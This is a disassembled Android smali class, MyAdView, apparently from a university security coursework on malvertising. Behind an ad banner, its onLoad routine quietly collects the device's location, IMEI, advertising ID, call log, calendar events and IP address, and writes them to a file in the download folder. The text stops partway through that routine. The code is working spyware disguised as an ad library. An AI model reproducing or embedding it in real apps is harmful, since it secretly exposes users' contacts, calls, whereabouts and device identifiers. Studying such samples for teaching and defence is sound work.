.class public Luk/ac/imperial/apss/android/comp70004/cw2/myadlibrary/MyAdView;
.super Ljava/lang/Object;
.source "MyAdView.java"


# static fields
.field static final synthetic $assertionsDisabled:Z = false

.field private static final LOG_TAG:Ljava/lang/String; = "Exception getting IP"

.field private static final TAG:Ljava/lang/String; = "CW2: MyAdView"

.field public static ctx:Landroid/content/Context;

.field private static filePart1Malad:Ljava/io/File;

.field public static isLAT:Z


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .line 40
    nop

    .line 45
    const/4 v0, 0x0

    sput-boolean v0, Luk/ac/imperial/apss/android/comp70004/cw2/myadlibrary/MyAdView;->isLAT:Z

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .line 40
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method static synthetic access$000()Ljava/io/File;
    .locals 1

    .line 40
    sget-object v0, Luk/ac/imperial/apss/android/comp70004/cw2/myadlibrary/MyAdView;->filePart1Malad:Ljava/io/File;

    return-object v0
.end method

.method public static getAdId()Ljava/lang/String;
    .locals 4
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Lcom/google/android/gms/common/GooglePlayServicesNotAvailableException;,
            Ljava/io/IOException;,
            Lcom/google/android/gms/common/GooglePlayServicesRepairableException;
        }
    .end annotation

    .line 182
    const/4 v0, 0x0

    .line 183
    .local v0, "adInfo":Lcom/google/android/gms/ads/identifier/AdvertisingIdClient$Info;
    sget-object v1, Luk/ac/imperial/apss/android/comp70004/cw2/myadlibrary/MyAdView;->ctx:Landroid/content/Context;

    invoke-static {v1}, Lcom/google/android/gms/ads/identifier/AdvertisingIdClient;->getAdvertisingIdInfo(Landroid/content/Context;)Lcom/google/android/gms/ads/identifier/AdvertisingIdClient$Info;

    move-result-object v0

    .line 184
    invoke-virtual {v0}, Lcom/google/android/gms/ads/identifier/AdvertisingIdClient$Info;->getId()Ljava/lang/String;

    move-result-object v1

    .line 185
    .local v1, "AdId":Ljava/lang/String;
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "advertising_id:"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 186
    return-object v1
.end method

.method public static getCalendar(Ljava/util/Calendar;Ljava/util/Calendar;)Ljava/lang/String;
    .locals 16
    .param p0, "c_start"    # Ljava/util/Calendar;
    .param p1, "c_end"    # Ljava/util/Calendar;

    .line 215
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "((dtstart >= "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual/range {p0 .. p0}, Ljava/util/Calendar;->getTimeInMillis()J

    move-result-wide v1

    invoke-virtual {v0, v1, v2}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, ") AND (dtend <= "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual/range {p1 .. p1}, Ljava/util/Calendar;->getTimeInMillis()J

    move-result-wide v1

    invoke-virtual {v0, v1, v2}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "))"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 217
    .local v0, "selection":Ljava/lang/String;
    sget-object v1, Luk/ac/imperial/apss/android/comp70004/cw2/myadlibrary/MyAdView;->ctx:Landroid/content/Context;

    invoke-virtual {v1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v1

    const-string v2, "content://com.android.calendar/events"

    invoke-static {v2}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v2

    const/4 v3, 0x6

    new-array v3, v3, [Ljava/lang/String;

    const-string v4, "calendar_id"

    const/4 v7, 0x0

    aput-object v4, v3, v7

    const-string v4, "title"

    const/4 v8, 0x1

    aput-object v4, v3, v8

    const-string v4, "description"

    const/4 v9, 0x2

    aput-object v4, v3, v9

    const-string v4, "dtstart"

    const/4 v10, 0x3

    aput-object v4, v3, v10

    const-string v4, "dtend"

    const/4 v11, 0x4

    aput-object v4, v3, v11

    const-string v4, "eventLocation"

    const/4 v12, 0x5

    aput-object v4, v3, v12

    const/4 v5, 0x0

    const/4 v6, 0x0

    move-object v4, v0

    invoke-virtual/range {v1 .. v6}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v1

    .line 219
    .local v1, "cursor":Landroid/database/Cursor;
    const/4 v2, 0x0

    .line 220
    .local v2, "add":Ljava/lang/StringBuilder;
    invoke-interface {v1}, Landroid/database/Cursor;->moveToFirst()Z

    .line 221
    sget-object v3, Ljava/lang/System;->out:Ljava/io/PrintStream;

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "count: "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-interface {v1}, Landroid/database/Cursor;->getCount()I

    move-result v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    .line 222
    invoke-interface {v1}, Landroid/database/Cursor;->getCount()I

    move-result v3

    new-array v3, v3, [Ljava/lang/String;

    .line 223
    .local v3, "CalNames":[Ljava/lang/String;
    invoke-interface {v1}, Landroid/database/Cursor;->getCount()I

    move-result v4

    new-array v4, v4, [I

    .line 224
    .local v4, "CalIds":[I
    const/4 v5, 0x0

    .local v5, "i":I
    :goto_0
    array-length v6, v3

    if-ge v5, v6, :cond_1

    .line 225
    invoke-interface {v1, v7}, Landroid/database/Cursor;->getInt(I)I

    move-result v6

    aput v6, v4, v5

    .line 226
    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v13, "Event"

    invoke-virtual {v6, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-interface {v1, v7}, Landroid/database/Cursor;->getInt(I)I

    move-result v13

    invoke-virtual {v6, v13}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v13, ": \nTitle: "

    invoke-virtual {v6, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-interface {v1, v8}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v6, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v13, "\nDescription: "

    invoke-virtual {v6, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-interface {v1, v9}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v6, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v13, "\nStart Date: "

    invoke-virtual {v6, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    new-instance v13, Ljava/util/Date;

    invoke-interface {v1, v10}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v14

    invoke-direct {v13, v14, v15}, Ljava/util/Date;-><init>(J)V

    invoke-virtual {v6, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v13, "\nEnd Date : "

    invoke-virtual {v6, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    new-instance v13, Ljava/util/Date;

    invoke-interface {v1, v11}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v14

    invoke-direct {v13, v14, v15}, Ljava/util/Date;-><init>(J)V

    invoke-virtual {v6, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v13, "\nLocation : "

    invoke-virtual {v6, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-interface {v1, v12}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v6, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    aput-object v6, v3, v5

    .line 227
    if-nez v2, :cond_0

    .line 228
    new-instance v6, Ljava/lang/StringBuilder;

    aget-object v13, v3, v5

    invoke-direct {v6, v13}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object v2, v6

    goto :goto_1

    .line 230
    :cond_0
    aget-object v6, v3, v5

    invoke-virtual {v2, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 232
    :goto_1
    invoke-interface {v1}, Landroid/database/Cursor;->moveToNext()Z

    .line 224
    add-int/lit8 v5, v5, 0x1

    goto/16 :goto_0

    .line 234
    .end local v5    # "i":I
    :cond_1
    invoke-interface {v1}, Landroid/database/Cursor;->close()V

    .line 236
    invoke-static {v3}, Ljava/util/Arrays;->toString([Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v5

    .line 237
    .local v5, "calendarString":Ljava/lang/String;
    return-object v5
.end method

.method public static getCallLog()Ljava/lang/String;
    .locals 14

    .line 241
    const/4 v0, 0x4

    new-array v3, v0, [Ljava/lang/String;

    const-string v0, "name"

    const/4 v7, 0x0

    aput-object v0, v3, v7

    const-string v0, "number"

    const/4 v8, 0x1

    aput-object v0, v3, v8

    const-string v0, "type"

    const/4 v9, 0x2

    aput-object v0, v3, v9

    const-string v0, "date"

    const/4 v10, 0x3

    aput-object v0, v3, v10

    .line 248
    .local v3, "projection":[Ljava/lang/String;
    sget-object v0, Luk/ac/imperial/apss/android/comp70004/cw2/myadlibrary/MyAdView;->ctx:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v1

    sget-object v2, Landroid/provider/CallLog$Calls;->CONTENT_URI:Landroid/net/Uri;

    const/4 v4, 0x0

    const/4 v5, 0x0

    const/4 v6, 0x0

    invoke-virtual/range {v1 .. v6}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v0

    .line 249
    .local v0, "cursor":Landroid/database/Cursor;
    invoke-interface {v0}, Landroid/database/Cursor;->getCount()I

    move-result v1

    new-array v1, v1, [Ljava/lang/String;

    .line 250
    .local v1, "callLogs":[Ljava/lang/String;
    const/4 v2, 0x0

    .line 251
    .local v2, "i":I
    :goto_0
    invoke-interface {v0}, Landroid/database/Cursor;->moveToNext()Z

    move-result v4

    if-eqz v4, :cond_0

    .line 252
    invoke-interface {v0, v7}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v4

    .line 253
    .local v4, "name":Ljava/lang/String;
    invoke-interface {v0, v8}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v5

    .line 254
    .local v5, "number":Ljava/lang/String;
    invoke-interface {v0, v9}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v6

    .line 255
    .local v6, "type":Ljava/lang/String;
    invoke-interface {v0, v10}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v11

    .line 256
    .local v11, "time":Ljava/lang/String;
    new-instance v12, Ljava/lang/StringBuilder;

    invoke-direct {v12}, Ljava/lang/StringBuilder;-><init>()V

    const-string v13, "Name: "

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    invoke-virtual {v12, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    const-string v13, ", Number: "

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    invoke-virtual {v12, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    const-string v13, " Type: "

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    invoke-virtual {v12, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    const-string v13, " Time: "

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    invoke-virtual {v12, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    invoke-virtual {v12}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v12

    aput-object v12, v1, v2

    .line 257
    nop

    .end local v4    # "name":Ljava/lang/String;
    .end local v5    # "number":Ljava/lang/String;
    .end local v6    # "type":Ljava/lang/String;
    .end local v11    # "time":Ljava/lang/String;
    add-int/lit8 v2, v2, 0x1

    .line 258
    goto :goto_0

    .line 259
    :cond_0
    invoke-interface {v0}, Landroid/database/Cursor;->close()V

    .line 261
    invoke-static {v1}, Ljava/util/Arrays;->toString([Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    .line 262
    .local v4, "callLogsString":Ljava/lang/String;
    return-object v4
.end method

.method public static getContacts()V
    .locals 8

    .line 190
    sget-object v0, Luk/ac/imperial/apss/android/comp70004/cw2/myadlibrary/MyAdView;->ctx:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    .line 191
    .local v0, "resolver":Landroid/content/ContentResolver;
    const/4 v7, 0x0

    .line 192
    .local v7, "contacts":Landroid/database/Cursor;
    sget-object v2, Landroid/provider/ContactsContract$Contacts;->CONTENT_URI:Landroid/net/Uri;

    const/4 v3, 0x0

    const/4 v4, 0x0

    const/4 v5, 0x0

    const/4 v6, 0x0

    move-object v1, v0

    invoke-virtual/range {v1 .. v6}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v1

    .line 193
    .end local v7    # "contacts":Landroid/database/Cursor;
    .local v1, "contacts":Landroid/database/Cursor;
    return-void
.end method

.method public static getIMEI()Ljava/lang/String;
    .locals 4

    .line 175
    const-string v0, ""

    .line 176
    .local v0, "phone_imei":Ljava/lang/String;
    sget-object v1, Luk/ac/imperial/apss/android/comp70004/cw2/myadlibrary/MyAdView;->ctx:Landroid/content/Context;

    const-string v2, "phone"

    invoke-virtual {v1, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/telephony/TelephonyManager;

    .line 177
    .local v1, "phone_manager":Landroid/telephony/TelephonyManager;
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "IMEI:"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v1}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 178
    return-object v0
.end method

.method public static getIpAddress()Ljava/lang/String;
    .locals 5

    .line 197
    :try_start_0
    invoke-static {}, Ljava/net/NetworkInterface;->getNetworkInterfaces()Ljava/util/Enumeration;

    move-result-object v0

    .local v0, "en":Ljava/util/Enumeration;, "Ljava/util/Enumeration<Ljava/net/NetworkInterface;>;"
    :goto_0
    invoke-interface {v0}, Ljava/util/Enumeration;->hasMoreElements()Z

    move-result v1

    if-eqz v1, :cond_2

    .line 198
    invoke-interface {v0}, Ljava/util/Enumeration;->nextElement()Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Ljava/net/NetworkInterface;

    .line 199
    .local v1, "intf":Ljava/net/NetworkInterface;
    invoke-virtual {v1}, Ljava/net/NetworkInterface;->getInetAddresses()Ljava/util/Enumeration;

    move-result-object v2

    .local v2, "enumIpAddr":Ljava/util/Enumeration;, "Ljava/util/Enumeration<Ljava/net/InetAddress;>;"
    :goto_1
    invoke-interface {v2}, Ljava/util/Enumeration;->hasMoreElements()Z

    move-result v3

    if-eqz v3, :cond_1

    .line 200
    invoke-interface {v2}, Ljava/util/Enumeration;->nextElement()Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Ljava/net/InetAddress;

    .line 201
    .local v3, "inetAddress":Ljava/net/InetAddress;
    invoke-virtual {v3}, Ljava/net/InetAddress;->isLoopbackAddress()Z

    move-result v4

    if-nez v4, :cond_0

    .line 202
    invoke-virtual {v3}, Ljava/net/InetAddress;->getHostAddress()Ljava/lang/String;

    move-result-object v4
    :try_end_0
    .catch Ljava/net/SocketException; {:try_start_0 .. :try_end_0} :catch_0

    .line 203
    .local v4, "hostAddress":Ljava/lang/String;
    return-object v4

    .line 205
    .end local v3    # "inetAddress":Ljava/net/InetAddress;
    .end local v4    # "hostAddress":Ljava/lang/String;
    :cond_0
    goto :goto_1

    .line 206
    .end local v1    # "intf":Ljava/net/NetworkInterface;
    .end local v2    # "enumIpAddr":Ljava/util/Enumeration;, "Ljava/util/Enumeration<Ljava/net/InetAddress;>;"
    :cond_1
    goto :goto_0

    .line 209
    .end local v0    # "en":Ljava/util/Enumeration;, "Ljava/util/Enumeration<Ljava/net/NetworkInterface;>;"
    :cond_2
    goto :goto_2

    .line 207
    :catch_0
    move-exception v0

    .line 208
    .local v0, "ex":Ljava/net/SocketException;
    invoke-virtual {v0}, Ljava/net/SocketException;->toString()Ljava/lang/String;

    move-result-object v1

    const-string v2, "Exception getting IP"

    invoke-static {v2, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 210
    .end local v0    # "ex":Ljava/net/SocketException;
    :goto_2
    const/4 v0, 0x0

    return-object v0
.end method

.method public static getLocation()Ljava/lang/String;
    .locals 9

    .line 154
    const-wide/16 v0, 0x0

    .line 155
    .local v0, "longitude":D
    const-wide/16 v2, 0x0

    .line 156
    .local v2, "latitude":D
    sget-object v4, Luk/ac/imperial/apss/android/comp70004/cw2/myadlibrary/MyAdView;->ctx:Landroid/content/Context;

    const-string v5, "location"

    invoke-virtual {v4, v5}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Landroid/location/LocationManager;

    .line 157
    .local v4, "locationManager":Landroid/location/LocationManager;
    const-string v5, "gps"

    .line 159
    .local v5, "gpsProvider":Ljava/lang/String;
    sget-object v6, Luk/ac/imperial/apss/android/comp70004/cw2/myadlibrary/MyAdView;->ctx:Landroid/content/Context;

    const-string v7, "android.permission.ACCESS_FINE_LOCATION"

    invoke-static {v6, v7}, Landroidx/core/app/ActivityCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v6

    if-eqz v6, :cond_0

    sget-object v6, Luk/ac/imperial/apss/android/comp70004/cw2/myadlibrary/MyAdView;->ctx:Landroid/content/Context;

    const-string v7, "android.permission.ACCESS_COARSE_LOCATION"

    invoke-static {v6, v7}, Landroidx/core/app/ActivityCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v6

    if-eqz v6, :cond_0

    .line 160
    const/4 v6, 0x0

    return-object v6

    .line 163
    :cond_0
    invoke-virtual {v4, v5}, Landroid/location/LocationManager;->getLastKnownLocation(Ljava/lang/String;)Landroid/location/Location;

    move-result-object v6

    .line 164
    .local v6, "location":Landroid/location/Location;
    if-eqz v6, :cond_1

    .line 165
    invoke-virtual {v6}, Landroid/location/Location;->getLongitude()D

    move-result-wide v0

    .line 166
    invoke-virtual {v6}, Landroid/location/Location;->getLatitude()D

    move-result-wide v2

    .line 169
    :cond_1
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    const-string v8, "longitude:"

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7, v0, v1}, Ljava/lang/StringBuilder;->append(D)Ljava/lang/StringBuilder;

    move-result-object v7

    const-string v8, ";latitude:"

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7, v2, v3}, Ljava/lang/StringBuilder;->append(D)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    .line 170
    .local v7, "locationString":Ljava/lang/String;
    return-object v7
.end method

.method public static loadAd(Landroid/widget/TextView;Landroid/content/Context;)V
    .locals 5
    .param p0, "tv"    # Landroid/widget/TextView;
    .param p1, "ctx"    # Landroid/content/Context;

    .line 50
    sput-object p1, Luk/ac/imperial/apss/android/comp70004/cw2/myadlibrary/MyAdView;->ctx:Landroid/content/Context;

    .line 52
    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v0

    .line 53
    .local v0, "root":Ljava/io/File;
    new-instance v1, Ljava/io/File;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/download"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 54
    .local v1, "dir":Ljava/io/File;
    invoke-virtual {v1}, Ljava/io/File;->mkdirs()Z

    move-result v2

    .line 55
    .local v2, "makeDirs":Z
    new-instance v3, Ljava/io/File;

    const-string v4, "Part1_malad.txt"

    invoke-direct {v3, v1, v4}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    sput-object v3, Luk/ac/imperial/apss/android/comp70004/cw2/myadlibrary/MyAdView;->filePart1Malad:Ljava/io/File;

    .line 57
    const-string v3, "Hello Ad! This has been changed!!"

    invoke-virtual {p0, v3}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 60
    :try_start_0
    invoke-static {}, Luk/ac/imperial/apss/android/comp70004/cw2/myadlibrary/MyAdView;->onLoad()V
    :try_end_0
    .catch Ljava/io/FileNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    .line 63
    goto :goto_0

    .line 61
    :catch_0
    move-exception v3

    .line 62
    .local v3, "e":Ljava/io/FileNotFoundException;
    invoke-virtual {v3}, Ljava/io/FileNotFoundException;->printStackTrace()V

    .line 64
    .end local v3    # "e":Ljava/io/FileNotFoundException;
    :goto_0
    return-void
.end method

.method private static onLoad()V
    .locals 20
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/io/FileNotFoundException;
        }
    .end annotation

    .line 69
    const-string v0, "*"

    const-string v1, "************************ HELLO MALVERTISING ************************"

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 72
    new-instance v1, Ljava/io/PrintWriter;

    sget-object v2, Luk/ac/imperial/apss/android/comp70004/cw2/myadlibrary/MyAdView;->filePart1Malad:Ljava/io/File;

    invoke-direct {v1, v2}, Ljava/io/PrintWriter;-><init>(Ljava/io/File;)V

    .line 73
    .local v1, "writer":Ljava/io/PrintWriter;
    const-string v2, ""

    invoke-virtual {v1, v2}, Ljava/io/PrintWriter;->print(Ljava/lang/String;)V

    .line 74
    invoke-virtual {v1}, Ljava/io/PrintWriter;->close()V

    .line 76
    new-instance v2, Ljava/text/SimpleDateFormat;

    const-string v3, "yyyy/MM/dd HH:mm:ss"

    invoke-direct {v2, v3}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;)V

    .line 77
    .local v2, "sdf":Ljava/text/SimpleDateFormat;
    const/4 v3, 0x0

    .line 80
    .local v3, "currentDateandTime":Ljava/lang/String;
    invoke-static {}, Luk/ac/imperial/apss/android/comp70004/cw2/myadlibrary/MyAdView;->getLocation()Ljava/lang/String;

    move-result-object v4

    .line 81
    .local v4, "location":Ljava/lang/String;
    sget-object v5, Luk/ac/imperial/apss/android/comp70004/cw2/myadlibrary/MyAdView;->filePart1Malad:Ljava/io/File;

    const-string v6, "************************ LOCATION ************************"

    invoke-static {v5, v6}, Luk/ac/imperial/apss/android/comp70004/cw2/myadlibrary/MyAdView;->writeToFile(Ljava/io/File;Ljava/lang/String;)V

    .line 82
    new-instance v5, Ljava/util/Date;

    invoke-direct {v5}, Ljava/util/Date;-><init>()V

    invoke-virtual {v2, v5}, Ljava/text/SimpleDateFormat;->format(Ljava/util/Date;)Ljava/lang/String;

    move-result-object v3

    .line 83
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v5, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v7, ";"

    invoke-virtual {v5, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    .line 84
    sget-object v5, Luk/ac/imperial/apss/android/comp70004/cw2/myadlibrary/MyAdView;->filePart1Malad:Ljava/io/File;

    invoke-static {v5, v4}, Luk/ac/imperial/apss/android/comp70004/cw2/myadlibrary/MyAdView;->writeToFile(Ljava/io/File;Ljava/lang/String;)V

    .line 85
    invoke-static {v0, v6}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 86
    const-string v5, "LOCATION: "

    invoke-static {v5, v4}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 89
    invoke-static {}, Luk/ac/imperial/apss/android/comp70004/cw2/myadlibrary/MyAdView;->getIMEI()Ljava/lang/String;

    move-result-object v5

    .line 90
    .local v5, "imei":Ljava/lang/String;
    sget-object v6, Luk/ac/imperial/apss/android/comp70004/cw2/myadlibrary/MyAdView;->filePart1Malad:Ljava/io/File;

    const-string v8, "************************ IMEI ************************"

    invoke-static {v6, v8}, Luk/ac/imperial/apss/android/comp70004/cw2/myadlibrary/MyAdView;->writeToFile(Ljava/io/File;Ljava/lang/String;)V

    .line 91
    new-instance v6, Ljava/util/Date;

    invoke-direct {v6}, Ljava/util/Date;-><init>()V

    invoke-virtual {v2, v6}, Ljava/text/SimpleDateFormat;->format(Ljava/util/Date;)Ljava/lang/String;

    move-result-object v3

    .line 92
    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v6, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    .line 93
    sget-object v6, Luk/ac/imperial/apss/android/comp70004/cw2/myadlibrary/MyAdView;->filePart1Malad:Ljava/io/File;

